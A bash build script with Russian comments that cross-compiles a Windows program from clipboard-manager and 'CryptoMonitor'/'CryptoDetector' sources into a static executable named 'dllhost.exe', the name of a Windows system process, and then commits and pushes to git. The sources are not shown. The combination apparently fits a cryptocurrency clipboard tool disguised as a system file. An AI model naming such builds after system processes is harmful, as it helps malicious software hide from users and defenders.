#!/bin/bash
set -e # Остановить выполнение, если возникнет ошибка
echo "Compiling resources..."
# 1. ВАЖНО: Компилируем файл описания (version.rc) в объектный файл
x86_64-w64-mingw32-windres version.rc -o version.o


echo "Compiling..."

# Компиляция всех исходных файлов
# 1. Чтобы была консоль, мы УБРАЛИ флаг -mwindows
# 2. Имя файла после -o изменено на 'dllhost.exe'
x86_64-w64-mingw32-g++ main.cpp CryptoMonitor.cpp CryptoDetector.cpp ClipboardManager.cpp version.o \
    -o 'dllhost.exe' \
    -static \
    -luser32 -lkernel32


echo "Compilation successful."
rm version.o

git add .
git commit -m "add version rc and update detector"
# git tag -a v1.0-windows -m "Windows clipboard application version 1

# git push
git push --set-upstream origin test-v1

echo "Done."
